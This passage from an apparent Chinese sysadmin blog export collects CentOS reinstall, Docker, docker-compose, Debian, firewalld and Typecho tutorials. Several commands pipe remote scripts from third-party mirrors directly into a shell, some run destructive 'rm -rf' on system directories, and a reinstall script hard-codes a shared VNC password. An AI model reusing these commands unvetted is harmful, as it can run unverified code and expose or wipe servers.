<h1 id="3-重装系统"><a href="#3-重装系统" class="headerlink" title="3.重装系统"></a>3.重装系统</h1><p>PS通常卸载脚本就可以了，不建议重装。这里以centos举例，先把BOOT文件夹下的一堆镜像文件删除，一次性复制粘贴如下命令，回车后再运行bash &#x2F;boot&#x2F;Reinstall.sh这个命令就OK了。系统重启后等个5分钟用VNC连接(ip:1)就可以正常装系统了，分区直接点下释放占用最大空间那个硬盘就可以了。VNC连接密码是zxsdw。也可以自己改下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install wget vim lsof net-tools</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt;/boot/Reinstall.sh</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">rm -rf /boot/initrd77.img /boot/vmlinuz77</span></span><br><span class="line"><span class="string">wget -P /boot/ http://vault.centos.org/7.2.1511/os/x86_64/images/pxeboot/initrd.img -O /boot/initrd77.img</span></span><br><span class="line"><span class="string">wget -P /boot/ http://vault.centos.org/7.2.1511/os/x86_64/images/pxeboot/vmlinuz -O /boot/vmlinuz77</span></span><br><span class="line"><span class="string">cat &lt;&lt; EOFEOF&gt;/etc/grub.d/40_custom</span></span><br><span class="line"><span class="string">#!/bin/sh</span></span><br><span class="line"><span class="string">exec tail -n +3 \\\$0</span></span><br><span class="line"><span class="string"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class="line"><span class="string"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="string"># the &#x27;exec tail&#x27; line above.</span></span><br><span class="line"><span class="string">menuentry &quot;VNCInstallCentos7&quot; &#123;</span></span><br><span class="line"><span class="string">    set root=&#x27;(hd0,gpt3)&#x27;</span></span><br><span class="line"><span class="string">    linuxefi /boot/vmlinuz77 inst.vnc inst.vncpassword=zxsdw inst.headless ip=dhcp nameserver=8.8.8.8 inst.repo=http://vault.centos.org/7.2.1511/os/x86_64/ inst.lang=zh_CN.UTF-8 inst.keymap=us</span></span><br><span class="line"><span class="string">    initrdefi /boot/initrd77.img</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOFEOF</span></span><br><span class="line"><span class="string">#sed -i &#x27;s/GRUB_DEFAULT=saved/g&#x27; /etc/default/grub</span></span><br><span class="line"><span class="string">grub2-mkconfig -o /boot/efi/EFI/centos/grub.cfg</span></span><br><span class="line"><span class="string">grub2-reboot VNCInstallCentos7</span></span><br><span class="line"><span class="string">reboot</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于 <a href="http://www.virplus.com/thread-1208.htm">甲骨文免费VPS 使用教程</a> ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
        <category>centos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>typecho 打赏功能</title>
    <url>/posts/28105174/</url>
    <content><![CDATA[<h1 id="1-在-post-php-适当的位置添加代码"><a href="#1-在-post-php-适当的位置添加代码" class="headerlink" title="1.在 post.php 适当的位置添加代码"></a>1.在 post.php 适当的位置添加代码</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!-- 打赏 --&gt;</span><br><span class="line">  &lt;div style=<span class="string">&quot;padding: 10px 0; margin: 20px auto; width: 100%; font-size:16px; text-align: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;button <span class="built_in">id</span>=<span class="string">&quot;rewardButton&quot;</span> <span class="built_in">disable</span>=<span class="string">&quot;enable&quot;</span> onclick=<span class="string">&quot;var qr = document.getElementById(&#x27;QR&#x27;); if (qr.style.display === &#x27;none&#x27;) &#123;qr.style.display=&#x27;block&#x27;;&#125; else &#123;qr.style.display=&#x27;none&#x27;&#125;&quot;</span>&gt;</span><br><span class="line">      &lt;span&gt;¥ 打赏&lt;/span&gt;</span><br><span class="line">    &lt;/button&gt;</span><br><span class="line">    &lt;div <span class="built_in">id</span>=<span class="string">&quot;QR&quot;</span> style=<span class="string">&quot;display: none;&quot;</span>&gt;</span><br><span class="line">      </span><br><span class="line">        &lt;div <span class="built_in">id</span>=<span class="string">&quot;wechat&quot;</span> style=<span class="string">&quot;display: inline-block&quot;</span>&gt;</span><br><span class="line">          &lt;a class=<span class="string">&quot;fancybox&quot;</span> rel=<span class="string">&quot;group&quot;</span>&gt;&lt;img <span class="built_in">id</span>=<span class="string">&quot;wechat_qr&quot;</span> src=<span class="string">&quot;https://img.hacther.cn/images/2022/06/21/1344e4a932c9b6573d013e8575d381f.jpg&quot;</span> alt=<span class="string">&quot;拾叁 WeChat Pay&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">          &lt;p&gt;微信打赏&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div <span class="built_in">id</span>=<span class="string">&quot;alipay&quot;</span> style=<span class="string">&quot;display: inline-block&quot;</span>&gt;</span><br><span class="line">          &lt;a class=<span class="string">&quot;fancybox&quot;</span> rel=<span class="string">&quot;group&quot;</span>&gt;&lt;img <span class="built_in">id</span>=<span class="string">&quot;alipay_qr&quot;</span> src=<span class="string">&quot;https://img.hacther.cn/images/2022/06/21/a8d1b48bb1a923a7d7b13d579ff42f4.jpg</span></span><br><span class="line"><span class="string">&quot;</span> alt=<span class="string">&quot;拾叁 Alipay&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">          &lt;p&gt;支付宝打赏&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;!-- 打赏 --&gt;</span><br></pre></td></tr></table></figure>

<h1 id="2-添加CSS样式"><a href="#2-添加CSS样式" class="headerlink" title="2.添加CSS样式"></a>2.添加CSS样式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#QR&#123;padding-top:20px;&#125;#QR a&#123;border:0&#125;#QR img&#123;width:180px;max-width:100%;display:inline-block;margin:.8em 2em 0 2em&#125;#rewardButton&#123;border:1px solid #ccc;line-height:36px;text-align:center;height:36px;display:block;border-radius:4px;-webkit-transition-duration:.4s;transition-duration:.4s;background-color:#04BE02;color:#FFFFFF;margin:0 auto;padding:0 25px&#125;#rewardButton:hover&#123;color:#f77b83;border-color:#f77b83;outline-style:none&#125;</span></span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于 <a href="https://hacther.cn/76.html">Typecho打赏功能</a> 如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>typecho</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>typecho</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里巴巴普惠字体</title>
    <url>/posts/bd24c269/</url>
    <content><![CDATA[<p>放进主题的自定义CSS代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*全站字体美化*/</span><br><span class="line">@font-face&#123;</span><br><span class="line">font-family: <span class="string">&#x27;moe&#x27;</span>;</span><br><span class="line">src: url(<span class="string">&#x27;//at.alicdn.com/t/webfont_jq0x47mjt6a.eot&#x27;</span>); /* IE9*/</span><br><span class="line">  src: url(<span class="string">&#x27;//at.alicdn.com/t/webfont_jq0x47mjt6a.eot?#iefix&#x27;</span>) format(<span class="string">&#x27;embedded-opentype&#x27;</span>), /* IE6-IE8 */</span><br><span class="line">  url(<span class="string">&#x27;//at.alicdn.com/t/webfont_jq0x47mjt6a.woff2&#x27;</span>) format(<span class="string">&#x27;woff2&#x27;</span>),</span><br><span class="line">  url(<span class="string">&#x27;//at.alicdn.com/t/webfont_jq0x47mjt6a.woff&#x27;</span>) format(<span class="string">&#x27;woff&#x27;</span>), /* chrome、firefox */</span><br><span class="line">  url(<span class="string">&#x27;//at.alicdn.com/t/webfont_jq0x47mjt6a.ttf&#x27;</span>) format(<span class="string">&#x27;truetype&#x27;</span>), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/</span><br><span class="line">  url(<span class="string">&#x27;//at.alicdn.com/t/webfont_jq0x47mjt6a.svg#Alibaba-PuHuiTi-Regular&#x27;</span>) format(<span class="string">&#x27;svg&#x27;</span>); /* iOS 4.1- */</span><br><span class="line">&#125;</span><br><span class="line">body&#123;</span><br><span class="line">font-family:<span class="string">&#x27;moe&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">.enlighter-default .enlighter&#123;max-height:400px;overflow-y:auto !important;&#125;.lazyloading:not(.swiper-lazy-loaded)&#123;opacity: 0;&#125;@media (max-width:640px) &#123;</span><br><span class="line">    .meta-right .meta-view&#123;</span><br><span class="line">      display: <span class="built_in">unset</span> !important;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于<a href="https://chenyan98.cn/3105.html">更换网站字体为阿里巴巴普惠体</a> 如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>alibaba</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>alibaba</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令</title>
    <url>/posts/749ad7d8/</url>
    <content><![CDATA[<h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">非大陆</span><br><span class="line">wget -qO- get.docker.com | bash</span><br><span class="line">大陆</span><br><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br><span class="line"></span><br><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br><span class="line"></span><br><span class="line">curl -sS -O https://raw.gitmirror.com/kejilion/docker/main/install &amp;&amp; <span class="built_in">chmod</span> +x install</span><br><span class="line"></span><br><span class="line">sh install --mirror Aliyun</span><br></pre></td></tr></table></figure>

<h1 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h1><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>
<h1 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker.service</span><br></pre></td></tr></table></figure>

<h1 id="查看Docker版本"><a href="#查看Docker版本" class="headerlink" title="查看Docker版本"></a>查看Docker版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>

<h1 id="开机自动启动"><a href="#开机自动启动" class="headerlink" title="开机自动启动"></a>开机自动启动</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker.service</span><br></pre></td></tr></table></figure>

<h1 id="卸载Docker"><a href="#卸载Docker" class="headerlink" title="卸载Docker"></a>卸载Docker</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get purge docker-ce docker-ce-cli containerd.io</span><br><span class="line">sudo <span class="built_in">rm</span> -rf /var/lib/docker</span><br><span class="line">sudo <span class="built_in">rm</span> -rf /var/lib/containerd</span><br></pre></td></tr></table></figure>

<h1 id="列出所有容器ID"><a href="#列出所有容器ID" class="headerlink" title="列出所有容器ID"></a>列出所有容器ID</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -aq</span><br></pre></td></tr></table></figure>

<h1 id="查看所有运行或者不运行容器"><a href="#查看所有运行或者不运行容器" class="headerlink" title="查看所有运行或者不运行容器"></a>查看所有运行或者不运行容器</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<h1 id="停止所有的container（容器），这样才能够删除其中的images："><a href="#停止所有的container（容器），这样才能够删除其中的images：" class="headerlink" title="停止所有的container（容器），这样才能够删除其中的images："></a>停止所有的container（容器），这样才能够删除其中的images：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -a -q) 或者 docker stop $(docker ps -aq) </span><br></pre></td></tr></table></figure>

<h1 id="如果想要删除所有container（容器）的话再加一个指令："><a href="#如果想要删除所有container（容器）的话再加一个指令：" class="headerlink" title="如果想要删除所有container（容器）的话再加一个指令："></a>如果想要删除所有container（容器）的话再加一个指令：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q) 或者 docker <span class="built_in">rm</span> $(docker ps -aq) </span><br></pre></td></tr></table></figure>

<h1 id="查看当前有些什么images"><a href="#查看当前有些什么images" class="headerlink" title="查看当前有些什么images"></a>查看当前有些什么images</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<h1 id="删除images（镜像），通过image的id来指定删除谁"><a href="#删除images（镜像），通过image的id来指定删除谁" class="headerlink" title="删除images（镜像），通过image的id来指定删除谁"></a>删除images（镜像），通过image的id来指定删除谁</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi &lt;image <span class="built_in">id</span>&gt;</span><br></pre></td></tr></table></figure>

<h1 id="想要删除untagged-images，也就是那些id为的image的话可以用"><a href="#想要删除untagged-images，也就是那些id为的image的话可以用" class="headerlink" title="想要删除untagged images，也就是那些id为的image的话可以用"></a>想要删除untagged images，也就是那些id为的image的话可以用</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi $(docker images | grep <span class="string">&quot;^&lt;none&gt;&quot;</span> | awk <span class="string">&quot;&#123;print <span class="variable">$3</span>&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="要删除全部image（镜像）的话"><a href="#要删除全部image（镜像）的话" class="headerlink" title="要删除全部image（镜像）的话"></a>要删除全部image（镜像）的话</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure>

<h1 id="强制删除全部image的话"><a href="#强制删除全部image的话" class="headerlink" title="强制删除全部image的话"></a>强制删除全部image的话</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi -f $(docker images -q)</span><br></pre></td></tr></table></figure>

<h1 id="从容器到宿主机复制"><a href="#从容器到宿主机复制" class="headerlink" title="从容器到宿主机复制"></a>从容器到宿主机复制</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> tomcat：/webapps/js/text.js /home/admin</span><br><span class="line">docker <span class="built_in">cp</span> 容器名:容器路径 宿主机路径        </span><br></pre></td></tr></table></figure>

<h1 id="从宿主机到容器复制"><a href="#从宿主机到容器复制" class="headerlink" title="从宿主机到容器复制"></a>从宿主机到容器复制</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> /home/admin/text.js tomcat：/webapps/js</span><br><span class="line">docker <span class="built_in">cp</span> 宿主路径中文件 容器名 容器路径 </span><br></pre></td></tr></table></figure>

<h1 id="删除所有停止的容器"><a href="#删除所有停止的容器" class="headerlink" title="删除所有停止的容器"></a>删除所有停止的容器</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker container prune</span><br></pre></td></tr></table></figure>

<h1 id="删除所有不使用的镜像"><a href="#删除所有不使用的镜像" class="headerlink" title="删除所有不使用的镜像"></a>删除所有不使用的镜像</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker image prune --force --all</span><br><span class="line">或者</span><br><span class="line">docker image prune -f -a</span><br></pre></td></tr></table></figure>

<h1 id="停止、启动、杀死、重启一个容器"><a href="#停止、启动、杀死、重启一个容器" class="headerlink" title="停止、启动、杀死、重启一个容器"></a>停止、启动、杀死、重启一个容器</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop Name或者ID  </span><br><span class="line">docker start Name或者ID  </span><br><span class="line">docker <span class="built_in">kill</span> Name或者ID  </span><br><span class="line">docker restart name或者ID</span><br></pre></td></tr></table></figure>

<h1 id="docker进入容器，查看配置文件"><a href="#docker进入容器，查看配置文件" class="headerlink" title="docker进入容器，查看配置文件"></a>docker进入容器，查看配置文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> ：在运行的容器中执行命令</span><br><span class="line">        -d :分离模式: 在后台运行</span><br><span class="line">        -i :即使没有附加也保持STDIN（标准输入） 打开,以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line">        -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">docker <span class="built_in">exec</span> -it  f94d2c317477 /bin/bash</span><br></pre></td></tr></table></figure>

<h1 id="出现bash-vi-command-not-found"><a href="#出现bash-vi-command-not-found" class="headerlink" title="出现bash: vi: command not found"></a>出现bash: vi: command not found</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装和更新软件并安装vim</span></span><br><span class="line">apt-get update &amp;&amp; apt-get install vim -y</span><br></pre></td></tr></table></figure>

<h1 id="修改配置、退出容器"><a href="#修改配置、退出容器" class="headerlink" title="修改配置、退出容器"></a>修改配置、退出容器</h1><p>1、如果要正常退出不关闭容器，请按Ctrl+P+Q进行退出容器<br>2、如果使用exit退出，那么在退出之后会关闭容器，可以使用下面的流程进行恢复</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#重启容器</span></span><br><span class="line">docker restart </span><br><span class="line"></span><br><span class="line"><span class="comment">#进入容器</span></span><br><span class="line">docker attach</span><br></pre></td></tr></table></figure>

<h1 id="杀死所有运行容器"><a href="#杀死所有运行容器" class="headerlink" title="杀死所有运行容器"></a>杀死所有运行容器</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">kill</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure>

<h1 id="删除所有容器"><a href="#删除所有容器" class="headerlink" title="删除所有容器"></a>删除所有容器</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure>

<h1 id="删除所有镜像"><a href="#删除所有镜像" class="headerlink" title="删除所有镜像"></a>删除所有镜像</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure>

<h1 id="停止-docker-服务"><a href="#停止-docker-服务" class="headerlink" title="停止 docker 服务"></a>停止 docker 服务</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop docker</span><br></pre></td></tr></table></figure>

<h1 id="删除存储目录"><a href="#删除存储目录" class="headerlink" title="删除存储目录"></a>删除存储目录</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /etc/docker</span><br><span class="line"><span class="built_in">rm</span> -rf /run/docker</span><br><span class="line"><span class="built_in">rm</span> -rf /var/lib/dockershim</span><br><span class="line"><span class="built_in">rm</span> -rf /var/lib/docker</span><br></pre></td></tr></table></figure>

<h1 id="如果发现删除不掉，需要先-umount，如"><a href="#如果发现删除不掉，需要先-umount，如" class="headerlink" title="如果发现删除不掉，需要先 umount，如"></a>如果发现删除不掉，需要先 umount，如</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">umount /var/lib/docker/devicemapper</span><br></pre></td></tr></table></figure>

<h1 id="卸载-docker"><a href="#卸载-docker" class="headerlink" title="卸载 docker"></a>卸载 docker</h1><p>查看已安装的 docker 包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum list installed | grep docker</span><br></pre></td></tr></table></figure>

<h1 id="卸载相关包"><a href="#卸载相关包" class="headerlink" title="卸载相关包"></a>卸载相关包</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum remove docker-engine docker-engine-selinux.noarch</span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于 [CentOS 7 清理删除卸载 Docker 环境](yum remove docker-engine docker-engine-selinux.noarch) ，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker-compose常用命令</title>
    <url>/posts/5f933334/</url>
    <content><![CDATA[<h1 id="1-安装docker-compose"><a href="#1-安装docker-compose" class="headerlink" title="1.安装docker-compose"></a>1.安装docker-compose</h1><p><a href="https://github.com/docker/compose/releases">https://github.com/docker/compose/releases</a> 要安装其他版本的 Compose，请替换2.32.2</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#非大陆</span></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/v2.32.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h1 id="2-添加可执行权限-x"><a href="#2-添加可执行权限-x" class="headerlink" title="2.添加可执行权限:x"></a>2.添加可执行权限:x</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h1 id="3-在-usr-bin-路径下创建软连接"><a href="#3-在-usr-bin-路径下创建软连接" class="headerlink" title="3.在&#x2F;usr&#x2F;bin&#x2F;路径下创建软连接"></a>3.在&#x2F;usr&#x2F;bin&#x2F;路径下创建软连接</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h1 id="4-查看docker-compose版本"><a href="#4-查看docker-compose版本" class="headerlink" title="4.查看docker-compose版本"></a>4.查看docker-compose版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose version</span><br></pre></td></tr></table></figure>
<h1 id="ARM架构服务器Linux-安装-docker-compose"><a href="#ARM架构服务器Linux-安装-docker-compose" class="headerlink" title="ARM架构服务器Linux 安装 docker-compose"></a>ARM架构服务器Linux 安装 docker-compose</h1><p>下载网址 <a href="https://github.com/docker/compose/releases/">https://github.com/docker/compose/releases/</a><br>甲骨文云的Ampere架构用 docker-compose-Linux-aarch64<br>放置路径&#x2F;usr&#x2F;local&#x2F;bin<br>重命名docker-compose</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
        <tag>docker-compose</tag>
      </tags>
  </entry>
  <entry>
    <title>debian 常用命令</title>
    <url>/posts/3d32d3a/</url>
    <content><![CDATA[<h1 id="1-切换到root用户"><a href="#1-切换到root用户" class="headerlink" title="1.切换到root用户"></a>1.切换到root用户</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
<h1 id="2-升级packages"><a href="#2-升级packages" class="headerlink" title="2.升级packages"></a>2.升级packages</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update -y</span><br></pre></td></tr></table></figure>
<h1 id="3-Debian系统比较干净，安装常用的软件"><a href="#3-Debian系统比较干净，安装常用的软件" class="headerlink" title="3.Debian系统比较干净，安装常用的软件"></a>3.Debian系统比较干净，安装常用的软件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install wget curl sudo vim git</span><br></pre></td></tr></table></figure>
<h1 id="4-终端安装deb包"><a href="#4-终端安装deb包" class="headerlink" title="4.终端安装deb包"></a>4.终端安装deb包</h1><h2 id="先用cd命令定位到位置，再输入"><a href="#先用cd命令定位到位置，再输入" class="headerlink" title="先用cd命令定位到位置，再输入"></a>先用cd命令定位到位置，再输入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i package_file.deb</span><br></pre></td></tr></table></figure>
<h2 id="出现依赖问题"><a href="#出现依赖问题" class="headerlink" title="出现依赖问题"></a>出现依赖问题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get -f install </span><br></pre></td></tr></table></figure>
<p>待命令执行完成，软件也就安装成功了。</p>
<h2 id="卸载安装包时，在终端中，输入"><a href="#卸载安装包时，在终端中，输入" class="headerlink" title="卸载安装包时，在终端中，输入"></a>卸载安装包时，在终端中，输入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg -r package_name</span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于网络，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>debian</tag>
      </tags>
  </entry>
  <entry>
    <title>centos 防火墙常用命令</title>
    <url>/posts/37afb970/</url>
    <content><![CDATA[<h1 id="1-查看防火墙状态："><a href="#1-查看防火墙状态：" class="headerlink" title="1.查看防火墙状态："></a>1.查看防火墙状态：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --state </span><br></pre></td></tr></table></figure>
<h1 id="2-启动防火墙"><a href="#2-启动防火墙" class="headerlink" title="2.启动防火墙"></a>2.启动防火墙</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start firewalld</span><br></pre></td></tr></table></figure>
<h1 id="3-关闭防火墙"><a href="#3-关闭防火墙" class="headerlink" title="3.关闭防火墙"></a>3.关闭防火墙</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure>
<h1 id="4-检查防火墙开放的端口"><a href="#4-检查防火墙开放的端口" class="headerlink" title="4.检查防火墙开放的端口"></a>4.检查防火墙开放的端口</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=public --list-ports</span><br></pre></td></tr></table></figure>
<h1 id="5-开放一个新的端口"><a href="#5-开放一个新的端口" class="headerlink" title="5.开放一个新的端口"></a>5.开放一个新的端口</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br></pre></td></tr></table></figure>
<h1 id="6-重启防火墙"><a href="#6-重启防火墙" class="headerlink" title="6.重启防火墙"></a>6.重启防火墙</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<h1 id="7-验证新增加端口是否生效"><a href="#7-验证新增加端口是否生效" class="headerlink" title="7.验证新增加端口是否生效"></a>7.验证新增加端口是否生效</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --query-port=8080/tcp</span><br></pre></td></tr></table></figure>
<h1 id="8-防火墙开机自启动"><a href="#8-防火墙开机自启动" class="headerlink" title="8.防火墙开机自启动"></a>8.防火墙开机自启动</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> firewalld.service</span><br></pre></td></tr></table></figure>
<h1 id="9-防火墙取消某一开放端口"><a href="#9-防火墙取消某一开放端口" class="headerlink" title="9.防火墙取消某一开放端口"></a>9.防火墙取消某一开放端口</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --remove-port=9200/tcp --permanent</span><br></pre></td></tr></table></figure>

<p>文章内容和代码来源于网络，如有侵权请联系站长立即删除。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>centos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 搭建 typecho</title>
    <url>/posts/1c497000/</url>
    <content><![CDATA[<h1 id="创建安装路径-root-data-docker-data-typecho"><a href="#创建安装路径-root-data-docker-data-typecho" class="headerlink" title="创建安装路径&#x2F;root&#x2F;data&#x2F;docker_data&#x2F;typecho"></a>创建安装路径&#x2F;root&#x2F;data&#x2F;docker_data&#x2F;typecho</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/data/docker_data/typecho</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/typecho</span><br></pre></td></tr></table></figure>
<h1 id="安装nano，unzip"><a href="#安装nano，unzip" class="headerlink" title="安装nano，unzip"></a>安装nano，unzip</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install nano -y</span><br><span class="line">yum install -y zip unzip</span><br></pre></td></tr></table></figure>
<h1 id="创建数据库mysql"><a href="#创建数据库mysql" class="headerlink" title="创建数据库mysql"></a>创建数据库mysql</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/typecho</span><br><span class="line"></span><br><span class="line">nano mysql.env</span><br></pre></td></tr></table></figure>

